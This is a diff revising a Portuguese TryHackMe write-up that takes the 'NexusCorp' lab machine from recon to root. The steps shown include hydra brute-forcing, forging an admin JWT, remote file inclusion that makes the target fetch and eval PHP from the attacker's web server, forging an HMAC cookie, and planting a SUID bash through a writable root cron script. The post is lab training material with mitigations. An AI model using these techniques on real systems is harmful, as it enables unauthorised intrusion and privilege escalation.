@@ -9,11 +9,11 @@ tags: [linux, tryhackme, nexuscorp, recon, nmap, gobuster, idor, jwt, hmac, rfi,
 
 # NexusCorp — Do Recon ao Root: IDOR, JWT, RFI, SSH e Cron
 
-Mais uma room linux do **TryHackMe**.
-Inicio: somente IP do alvo "NexusCorp".
-Objetivo era descobrir a superfície de ataque, conseguir acesso ao portal, encontrar uma forma de entrar no servidor e chegar a **root**.
+Mais uma room Linux do **TryHackMe**.
+Início: somente o IP do alvo, a NexusCorp.
+O objetivo era descobrir a superfície de ataque, conseguir acesso ao portal, encontrar uma forma de entrar no servidor e chegar a **root**.
 
-Essa escalada é básicamente uma sequencia de missconfigures.
+Essa escalação foi, basicamente, uma sequência de configurações incorretas (*misconfigurations*).
 
 > **Aviso:** Tudo feito em laboratório autorizado.
 
@@ -87,19 +87,19 @@ O primeiro reconhecimento mostrou duas portas:
 80/tcp open  http Apache httpd 2.4.58 (Ubuntu)
 ~~~
 
-Enumerei as portas com nmap:
+Comando usado:
 
 ~~~bash
 TARGET=10.66.188.47
 nmap -sV -sC "$TARGET"
 ~~~
-- `TARGET`: cria uma variavel de ambiente, depois podemos usar o $ pra chamar uma variavel, no caso $TARGET.
+- `TARGET`: define uma variável do shell; depois, podemos reutilizar o valor com `$TARGET`.
 - `-sV`: tenta identificar serviço e versão.
 - `-sC`: executa os scripts padrão.
-  Podemos usar o -p tambem:
-- `-p`: seleciona portas. Se precisar checar todas as portas TCP, usar `-p-` dentro do escopo autorizado.
+- Também podemos usar `-p` para selecionar portas específicas.
+- `-p`: seleciona portas. Para verificar todas as portas TCP, usamos `-p-` dentro do escopo autorizado.
 
-O SSH estava disponível, ele não aceitava login anonimo, então deixei de lado por enquanto.
+O SSH estava disponível, mas eu ainda não tinha credenciais. Deixei esse serviço de lado por enquanto.
 
 ### 2.2 Gobuster: combinar wordlists e descobrir PHP
 
@@ -149,7 +149,7 @@ Principais achados:
 ### 3.1 Descobrir a chave e descriptografar
 
 Em `/backup/README.txt`, li que `config.enc` era um backup **AES-128-ECB** e que a referência da chave estava em `/static/app.js`.
-Então, fui dar uma olhada no app.js.
+Então fui dar uma olhada no `app.js`.
 
 ~~~javascript
 _backupKey: 'N3xusK3y2024!!'
@@ -167,11 +167,11 @@ xxd -l 32 config.enc
 - `file`: tenta identificar seu tipo.
 - `xxd -l 32`: exibe os 32 primeiros bytes em hexadecimal.
 
-Aqui cometi um pequeno erro de atenção, tentei decifrar com AES-256-CBC e não funcionou. O arquivo era AES-128-ECB, e o `-K` do OpenSSL exige uma **chave em hexadecimal**, não a string original.
+Aqui cometi um pequeno erro de atenção: tentei descriptografar com AES-256-CBC, mas o arquivo era AES-128-ECB. O parâmetro `-K` do OpenSSL exige uma **chave em hexadecimal**, não a string original.
 
-A chave encontrada tinha 14 bytes e precisava de **dois bytes nulos** para completar 16 conforme escrito no arquivo javascript:
-~~~
-// Key: N3xusK3y2024!!  (pad to 16 bytes with �)
+A chave encontrada tinha 14 bytes e precisava de **dois bytes nulos** para completar 16, conforme indicado no JavaScript:
+~~~javascript
+// Key: N3xusK3y2024!!  (pad to 16 bytes with \x00)
 ~~~
 ~~~bash
 openssl enc -d -aes-128-ecb \
@@ -195,14 +195,14 @@ Resultado:
 
 **Achei o usuário `devops`, mas ainda não tinha senha.**
 
-**A criptografia AES funciona de maneira sinmétrica, ou seja, usa a mesma chave pra criptografar e descriptografar e o modo ECB indica que é criptografado em blocos individuais**
+**O AES é uma cifra simétrica:** utiliza a mesma chave para criptografar e descriptografar. No modo ECB, cada bloco é criptografado de forma independente; blocos iguais podem produzir resultados iguais, expondo padrões.
 **Mitigação:** segredos jamais devem estar em JavaScript público. Backups ficam fora da raiz do site, com acesso restrito; em projetos reais, preferir criptografia autenticada como AES-GCM e gerenciamento seguro de chaves.
 
 ### 3.2 Usuários e recuperação de senha
 
-Até agora, eu só enumerei e olhei os arquivos publicos, então voltei pra aplicação pra verificar os outros diretorios.
+Até agora, eu só tinha enumerado e examinado os arquivos públicos. Então voltei à aplicação para verificar os outros diretórios.
 
-A página `/team.php` revelou usuarios, como eu sei que o formulario de login pede um usuario no formato nome.sobrenome salvei em um txt:
+A página `/team.php` revelou usuários. Como o formulário de login pedia um nome no formato `nome.sobrenome`, salvei a lista em um arquivo TXT:
 
 ~~~text
 laura.hayes
@@ -214,7 +214,7 @@ david.brown
 james.wright
 ~~~
 
-No formulário de `/forgot.php` enviava `username` por POST:
+O formulário de `/forgot.php` enviava `username` por POST:
 
 ~~~bash
 curl -s "http://$TARGET/forgot.php" \
@@ -230,14 +230,14 @@ Isso é **User Enumeration**: o aplicativo revela diferenças que permitem valid
 
 **Mitigação:** retornar mensagens genéricas, usar rate limiting e não revelar contas/e-mails desnecessariamente.
 
-Nesse lab, a função de recuperar email não "serviu" de nada no teste de penetração, mas é sempre bom evitar-mos que isso aconteça ;-)
+Nesse lab, a função de recuperação de e-mail não trouxe acesso adicional, mas vale registrar a falha de enumeração e como evitá-la.
 <a id="inicial"></a>
 
 ## 4. Acesso inicial
 
-Bom, aqui eu já tinha feito uma enumeração externa em tudo que é possivel, não vou colocar todos resultados pq a maioria não levava a nada.
-Não encontrei nenhuma pista em html, ou arquivo solto.
-Então decidi voltar pro formulario de login...
+Aqui eu já tinha feito uma enumeração externa de tudo o que era possível. Não vou colocar todos os resultados, porque a maioria não levou a nada.
+Não encontrei outras pistas úteis no HTML nem em arquivos avulsos.
+Então decidi voltar ao formulário de login...
 
 Testei aspas simples e condições `AND 1=1`/`AND 1=2` em endpoints de login e recuperação. As respostas **não comprovaram SQL Injection**. A aplicação também armazenou aspas nos títulos dos tickets como texto normal, sem demonstrar execução SQL nem XSS.
 
@@ -258,7 +258,7 @@ hydra -l sarah.johnson -P rockyou.txt "$TARGET" \
 
 **Credencial encontrada e confirmada no portal:** `sarah.johnson:password`.
 
-Agora **cuidado** eu tive um falso positivo com Laura. Se a resposta do servidor mudar para algo que não contenha `Invalid credentials`, o Hydra pode anunciar sucesso incorretamente. Isso fez eu perder uns minutos tentando entender kkk mas no fim eu descartei o user laura e voltei pra lista, como a sarah era a segunda da lista o hydra encontrou rapidamente a senha.
+**Cuidado:** tive um falso positivo com Laura. Se a resposta do servidor mudar para algo que não contenha `Invalid credentials`, o Hydra pode anunciar sucesso incorretamente. Perdi alguns minutos tentando entender, mas descartei o resultado de Laura e voltei à lista. Com Sarah, o Hydra encontrou rapidamente uma senha que confirmei no portal.
 
 **Mitigação:** MFA, senhas fortes, proteção contra tentativas repetidas, logs e alertas de autenticação.
 
@@ -266,8 +266,8 @@ Agora **cuidado** eu tive um falso positivo com Laura. Se a resposta do servidor
 
 ## 5. IDOR nos perfis — Flag 1
 
-Blz, usuario e senha na mão acessei o portal de usuarios.
-Dentro do portal, consultei `/api/users/profile.php?id=3`, que correspondia a Sarah. Troquei o numero do ID só de sacanagem para `1` e voilà temos um idor:
+Com usuário e senha em mãos, acessei o portal.
+No portal, consultei `/api/users/profile.php?id=3`, que correspondia a Sarah. Troquei o número do ID para `1` e encontrei um IDOR:
 
 ~~~text
 /api/users/profile.php?id=1
@@ -300,7 +300,7 @@ curl -s "http://$TARGET/api/users/profile.php?id=1" \
 
 ### 6.1 Cookie não é JWT
 
-O cookie armazena dados da sessão no navegador, e o JWT é um token usado pra autenticação. Eles podem
+O cookie armazena dados da sessão no navegador, enquanto o JWT é um token usado para autenticação. Eles podem
 coexistir e não dependem necessariamente um do outro. No contexto do lab, ao efetuar o login eu recebia um cookie.
 Já o token, eu precisava solicitar na API.
 
@@ -317,11 +317,11 @@ Com a sessão válida de Sarah, solicitei o token em:
 
 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM2MjAzNDUsImV4cCI6MTc5MzYyMzk0NX0.C\/TwmOVH+lzeGX2AqjSXJE8BCdKRFCrow2aHGTu\/ITA","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
 ~~~
-Depois, olhei a página de tickets pra ver se existia alguma possibilidade de injection mas foi sem sucesso.
+Depois, olhei a página de tickets para verificar possíveis falhas de injeção, mas sem sucesso.
 
-O login tambem revelou um segundo possivel alvo:
+O login também revelou outro possível alvo:
 
-/api/files.php?name=
+`/api/files.php?name=`
 
 ~~~bash
 COOKIE='<valor_original_do_cookie>'
@@ -332,30 +332,30 @@ curl -i "http://$TARGET/api/files.php" \
   -H "Authorization: Bearer $TOKEN"
 ~~~
 
-A API respondeu `Admin JWT required` 
+A API respondeu `Admin JWT required`.
 
-Normalmente um JWT é dividido em 3 partes. 
+Um JWT é dividido em três partes:
 
-HEADER.PAYLOAD.SIGNATURE
+`HEADER.PAYLOAD.SIGNATURE`
 
 - `Header`: algoritmo utilizado na assinatura.
 - `Payload`: informações como ID, usuário, permissões e expiração.
 - `Signature`: assinatura que permite verificar se o token foi alterado.
 
-No caso da lab o token divido ficava assim, pra exemplo:
+No laboratório, um exemplo de token dividido ficava assim:
 
 - `Header`: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 - `Payload`: eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM2MjE5NjAsImV4cCI6MTc5MzYyNTU2MH0
 - `Signature`: cYelhDc97iw0LxgeFgeekrZ8fEGGRorjzoqbMOuJ0xQ
 
-Decodificado
+Após decodificar as partes de texto:
 
 - `Header`: {"alg":"HS256","typ":"JWT"}
 - `Payload`: {"sub":"sarah.johnson","role":"user","iat":1793621960,"exp":1793625560}
-- `Signature`: q¥7=î,4/¶||AFãÎ0ëÓ
+- `Signature`: bytes binários, não necessariamente legíveis como texto UTF-8.
   
 
-Então eu testei, se eu trocar só a role pra admin, sem recalcular a assinatura:
+Então testei a troca de `role` para `admin`, sem recalcular a assinatura:
 
 ~~~bash
 FORGED=$(TOKEN="$TOKEN" python3 - <<'PY'
@@ -394,7 +394,7 @@ O código separa as partes, repõe o padding Base64URL e mostra o JSON. **Decodi
 
 ### 6.2 Ler arquivos do aplicativo
 
-Com o JWT autenticado com a role admin, fui verificar como funcionava a leitura de arquivos pelo files.php
+Com o JWT adulterado, que a API aceitou como `admin`, fui verificar como funcionava a leitura de arquivos pelo `files.php`.
 
 O parâmetro informado pela API era `name=/var/www/html/filename.txt`. Eu consegui ler inclusive o código-fonte de `api/files.php`:
 
@@ -428,10 +428,10 @@ if (strpos($name, 'http://') === 0 || strpos($name, 'https://') === 0) {
 
 O servidor baixava o código de uma URL externa e executava com `eval()`. Esse bloco era processado **antes** da validação `realpath()` dos arquivos locais. Resultado: **RFI (Remote File Inclusion) → RCE (Remote Code Execution)**.
 
-Como a url é processada antes de validar, podemos fazer o seguinte:
+Como a URL é processada antes da validação do caminho local, usei o seguinte teste:
 
-Na AttackBox, fiz um txt com um comando PHP.
-O servidor ao receber esse arquivo executa ele como se fosse um codigo php e nao um txt.
+Na AttackBox, criei um arquivo TXT com um comando PHP.
+O servidor baixa o conteúdo desse arquivo e o executa como código PHP, independentemente da extensão `.txt`.
 
 Por exemplo:
 
@@ -441,16 +441,16 @@ echo 'echo "RFI_OK: " . gethostname();' > proof.txt
 python3 -m http.server 8000 --bind 0.0.0.0
 ~~~
 
-O texto "echo... gethostname()" foi salvo no arquivo .txt, esse arquivo vai ser executado remotamente pelo target.
+O comando `echo "RFI_OK: " . gethostname();` ficou salvo no arquivo `.txt`. O alvo executa esse conteúdo ao buscá-lo pela URL.
 
-No codigo php tem a seguinte linha:
+O código PHP contém a seguinte linha:
 
-eval(str_replace('<?php', '', $remote));
+`eval(str_replace('<?php', '', $remote));`
 
-Essa linha vai remover tudo que estiver escrito <?php e depois vai executar remotamente.
+Essa linha remove as ocorrências literais de `<?php` e executa o conteúdo baixado **no servidor**.
 
-No nosso caso, 'echo "RFI_OK: " . gethostname();' vira **eval("echo "RFI_OK: " . gethostname();");**
-e isso em php faz o seguinte:
+No nosso caso, o conteúdo é interpretado pelo PHP como `eval('echo "RFI_OK: " . gethostname();');`.
+Esse código PHP faz o seguinte:
 
 - `echo`: imprime uma informação.
 - `"RFI_OK: "`: texto.
@@ -559,6 +559,10 @@ O bot buscava tickets não revisados e fazia requisições às URLs presentes na
 
 O cookie tinha duas partes: **Base64(JSON).assinatura hexadecimal**, assinada por HMAC-SHA256. Tentar editar `role=user` para `admin` mantendo a assinatura antiga resultou em `302` para o login. Agora, com a chave exposta, pude gerar uma assinatura válida:
 
+> **O que é HMAC?** *Hash-based Message Authentication Code* é um código de autenticação gerado a partir de uma **mensagem** e de uma **chave secreta compartilhada**, usando uma função hash (aqui, SHA-256). Quem conhece a chave consegue gerar ou verificar o HMAC; se alguém altera a mensagem sem conhecer a chave, a assinatura deixa de conferir.
+
+No cookie, os dados de `user_id`, `username` e `role` estavam codificados em Base64 e acompanhados de um **HMAC-SHA256** em hexadecimal. **Base64 não criptografa o conteúdo**: a proteção contra adulteração vem da assinatura. Como a chave estava exposta, consegui criar uma sessão administrativa com uma assinatura válida.
+
 ~~~bash
 ADMIN_COOKIE=$(python3 - <<'PY'
 import base64, json, hmac, hashlib
@@ -650,11 +654,51 @@ O `sudo -l` negou privilégios. Mas as permissões do script eram:
 
 O proprietário era `root`, porém **o grupo `devops` tinha escrita**. O script verificava se Apache/MySQL estavam ativos e registrava o uso do disco em `/var/log/nexus_health.log`.
 
+#### Entendendo diretórios e permissões Linux
+
+Para conferir as permissões do diretório **e** do arquivo:
+
+~~~bash
+ls -ld /opt/monitoring
+ls -l /opt/monitoring/health_report.sh
+~~~
+
+~~~text
+drwxr-xr-x 2 root root   ... /opt/monitoring
+-rwxrwxr-- 1 root devops ... /opt/monitoring/health_report.sh
+~~~
+
+- O primeiro caractere é `d` para **diretório** e `-` para **arquivo comum**.
+- Os nove caracteres seguintes são três blocos: **dono**, **grupo** e **outros**. Em `rwxrwxr--`, o dono e o grupo podem ler, escrever e executar; outros só podem ler.
+- As duas colunas após a contagem de links indicam **dono e grupo**. `root root` significa dono `root`, grupo `root`; `root devops` significa dono `root`, grupo `devops`.
+- Em um **arquivo**, `r` permite leitura, `w` permite alterar o conteúdo e `x` permite execução.
+- Em um **diretório**, `r` permite listar nomes, `w` permite criar/remover/renomear entradas (com `x`) e `x` permite atravessar o diretório para acessar caminhos conhecidos.
+
+O diretório `/opt/monitoring` era `root:root`, mas permitia travessia aos demais usuários (`x`). Já o **arquivo** era `root:devops` e concedia escrita (`w`) ao grupo `devops`. Por isso pude alterar o script mesmo sem poder modificar as entradas do diretório.
+
+#### Como descobrir quem pertence ao grupo?
+
+~~~bash
+getent group devops
+id devops
+groups devops
+
+# Incluir também usuários cujo grupo primário seja devops:
+GID=$(getent group devops | cut -d: -f3)
+getent passwd | awk -F: -v gid="$GID" '$4 == gid {print $1}'
+~~~
+
+- `getent group devops`: mostra o grupo, seu GID e membros **suplementares** listados no cadastro do grupo.
+- `id devops` / `groups devops`: mostram os grupos do usuário. No laboratório, `id` confirmou `gid=1001(devops)`.
+- O `awk` compara o quarto campo de cada conta (GID primário) com o GID de `devops`, para encontrar também os integrantes por **grupo primário**.
+
+> **Dica:** `getent group devops` pode mostrar a lista de membros vazia mesmo com o usuário `devops` pertencendo ao grupo. Isso acontece quando `devops` usa esse grupo como **grupo primário**. Para verificar a permissão de uma conta específica, use `id <usuario>`. ACLs adicionais podem ser consultadas com `getfacl <arquivo>`.
+
 > Ter permissão para alterar um script **não basta** para virar root. Tudo depende de QUEM EXECUTA.
 
 ### 9.2 pspy confirmou execução como root
 
-A ferramenta `pspy64` já estava na máquina, mas eu poderia enviar ela caso necessario, já que estava logado por ssh.
+A ferramenta `pspy64` já estava na máquina, mas eu também poderia transferi-la por SSH, caso necessário.
 
 ~~~bash
 /opt/tools/pspy64
@@ -681,7 +725,7 @@ grep -R 'health_report.sh' /etc/crontab /etc/cron.d \
 
 ### 9.3 Criar um Bash SUID como root
 
-Guardei uma cópia do script para restaurar depois:
+Antes de alterar o script, guardei uma cópia do original:
 
 ~~~bash
 cp /opt/monitoring/health_report.sh ~/health_report.sh.bak
@@ -734,7 +778,7 @@ O segundo autor explorou **o mesmo script gravável executado como root**, mas, 
 | **Meu Bash SUID** | Não exige conexão de retorno depois de criado | Deixa executável SUID no disco; depende de filesystem sem `nosuid` |
 | **Reverse shell via cron** | Recebe shell diretamente com a identidade do cron | Requer listener, conectividade TCP e ferramentas no alvo |
 
-Um detalhe importante: ele usou `>` para **substituir** o conteúdo do script; eu usei `>>` para **acrescentar** a linha e manter o monitoramento original. Sobrescrever pode interromper a tarefa legítima. Em ambos os casos, o teste exige backup e restauração.
+Um detalhe importante: ele usou `>` para **substituir** o conteúdo do script; eu usei `>>` para **acrescentar** a linha e manter o monitoramento original. Sobrescrever pode interromper a tarefa legítima. Em sistemas persistentes, é importante fazer backup e restaurar o arquivo após o teste.
 
 <a id="alternativas"></a>
 
@@ -798,6 +842,8 @@ ps -eo user,pid,ppid,args
 - `-perm -4000`: busca executáveis com SUID.
 - `ps -eo`: lista usuário, PID, PPID e comandos.
 - `2>/dev/null`: oculta erros de permissão; não significa que o sistema inteiro foi verificado.
+
+> **Dica para ambientes persistentes:** depois de um teste autorizado, restaure scripts modificados e remova arquivos temporários, shells SUID e outros artefatos. Nas VMs descartáveis do TryHackMe, essa limpeza não foi uma etapa necessária para concluir a room.
 
 ## Referências e posts relacionados
 
